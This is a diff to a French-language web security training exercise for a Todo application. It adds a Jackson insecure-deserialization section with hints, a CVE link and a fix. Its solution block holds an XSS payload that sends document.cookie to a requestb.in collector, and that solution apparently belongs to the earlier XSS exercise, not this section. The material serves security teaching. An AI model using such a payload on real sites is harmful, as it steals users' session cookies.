@@ -279,7 +279,7 @@ Le site est sensible aux attaques XSS. Profitez en pour obtenir les informations
 Utilisez le site https://requestb.in/ pour recueillir les informations de l'attaque XSS
 --
 
-[id=astuce16,role=collapse]
+[id=astuce17,role=collapse]
 --
 Créez un todo de type publique avec un script d'attaque
 --
@@ -414,6 +414,58 @@ Supprimez vos droits administrateurs puis essayez d'accéder et/ou modifier les 
 
 
 == Insecure deserialization
+
+Le format JSON n'est pas exempt de failles. Il permet de gérer le polymorphisme et si il
+est mal configuré, permet des attaques.
+
+Regarder le format Json des Todos pour utiliser un tel exploit.
+
+++++
+<a class="btn btn-xs btn-default" role="button" data-toggle="collapse" href="#astuce18" aria-expanded="false" aria-controls="collapseExample">
+  Indice 1
+</a>
+<a class="btn btn-xs btn-default" role="button" data-toggle="collapse" href="#astuce19" aria-expanded="false" aria-controls="collapseExample">
+  Indice 2
+</a>
+<a class="btn btn-xs btn-default" role="button" data-toggle="collapse" href="#astuce20" aria-expanded="false" aria-controls="collapseExample">
+  Indice 3
+</a>
+<a class="btn btn-xs btn-default" role="button" data-toggle="collapse" href="#reponse10" aria-expanded="false" aria-controls="collapseExample">
+  Solution
+</a>
+++++
+
+[id=astuce18,role=collapse]
+--
+ Le champ secret est de type Object: utilisez le pour passer un objet `gadget` qui exploitera cette faille.
+--
+[id=astuce19,role=collapse]
+--
+ un peu d'aide ? https://adamcaudill.com/2017/10/04/exploiting-jackson-rce-cve-2017-7525/
+--
+[id=astuce20,role=collapse]
+--
+ utilisez le fichier `Exploit.txt` comme payload de bytecode et utiliser votre client REST
+ pour envoyer la requête.
+
+ Puis consultez la log de votre application.
+ L'exécution de la requête REST a peut-être renvoyé une erreur mais l'exploit a bien été fait.
+--
+
+
+[id=reponse10,role=collapse]
+--
+utilisez le code suivant dans la description de la todo (en remplaçant l'id 1lwyhpu1 par celui que vous avez généré).
+<script>document.write("<img src=https://requestb.in/1lwyhpu1?s="+encodeURI(document.cookie)+"></img>");</script>
+--
+
+* Correction
+
+. Mettre à jour ses dépendances (cf exercice suivants) : les auteurs de la bibliothèques mettent à jour
+régulièrement la librairie pour bannir les classes `gadgets` reconnues
+. Ne pas utiliser la détermination du type par classe mais par nom : voir la classe Todo et remplacer
+l'annotation par celle en commentaire (Les types possibles sont à implémenter).
+
 
 == Composants vulnérables
 
